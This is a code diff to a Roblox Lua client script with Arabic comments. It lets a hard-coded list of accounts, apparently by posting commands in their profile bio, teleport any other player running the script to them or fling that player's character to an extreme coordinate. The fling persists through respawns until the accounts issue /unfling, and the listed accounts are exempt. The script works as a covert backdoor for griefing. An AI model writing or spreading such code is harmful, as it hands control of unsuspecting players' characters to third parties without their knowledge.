@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
+-- لاعبين محصنين (لا يتأثرون)
 local immuneLocals = {
     Sajwaad = true,
     ghalidev_0 = true,
@@ -12,17 +13,53 @@ if immuneLocals[LocalPlayer.Name] then
     return
 end
 
-
+-- لاعبين نراقب أوامرهم
 local monitoredPlayers = {
     Sajwaad = true,
     ghalidev_0 = true,
     iskeowa = true,
+    wkwjdnsnsndnxxnsnsn = true,
     yew99yew = true
 }
 
 local myNameLower = string.lower(LocalPlayer.Name)
 local myNamePrefix = string.sub(myNameLower, 1, 3)
 
+-- ===== fling state =====
+local FAR_POS = Vector3.new(999999999, 999999999, 999999999)
+_G.__FLING_ORIGIN = _G.__FLING_ORIGIN or nil
+_G.__FLUNG = _G.__FLUNG or false
+
+local function getHRP()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    return char:WaitForChild("HumanoidRootPart")
+end
+
+local function doFling()
+    if _G.__FLUNG then return end
+    local hrp = getHRP()
+    _G.__FLING_ORIGIN = hrp.CFrame
+    _G.__FLUNG = true
+    hrp.CFrame = CFrame.new(FAR_POS)
+end
+
+local function doUnfling()
+    if not _G.__FLUNG then return end
+    if not _G.__FLING_ORIGIN then return end
+    local hrp = getHRP()
+    hrp.CFrame = _G.__FLING_ORIGIN
+    _G.__FLUNG = false
+end
+
+-- إبقاؤك بعيدًا حتى يتم /unfling (حتى بعد Respawn)
+LocalPlayer.CharacterAdded:Connect(function(char)
+    task.wait(0.1)
+    if _G.__FLUNG then
+        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(FAR_POS)
+    end
+end)
+
+-- ===== تنفيذ الأوامر =====
 local function executeCommand(command, fromPlayer)
     command = string.lower(command)
 
@@ -39,13 +76,25 @@ local function executeCommand(command, fromPlayer)
     if command == "/bring all"
     or (string.sub(command, 1, 6) == "/bring" and string.find(command, myNamePrefix, 7, true)) then
         if fromPlayer.Character and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-            char:WaitForChild("HumanoidRootPart").CFrame =
-                fromPlayer.Character.HumanoidRootPart.CFrame
+            local hrp = getHRP()
+            hrp.CFrame = fromPlayer.Character.HumanoidRootPart.CFrame
         end
+    end
+
+    -- ===== /fling =====
+    if command == "/fling all"
+    or (string.sub(command, 1, 6) == "/fling" and string.find(command, myNamePrefix, 7, true)) then
+        doFling()
+    end
+
+    -- ===== /unfling =====
+    if command == "/unfling all"
+    or (string.sub(command, 1, 8) == "/unfling" and string.find(command, myNamePrefix, 9, true)) then
+        doUnfling()
     end
 end
 
+-- ===== مراقبة Bio =====
 local function monitorPlayer(player)
     if not monitoredPlayers[player.Name] then return end
     if player == LocalPlayer then return end
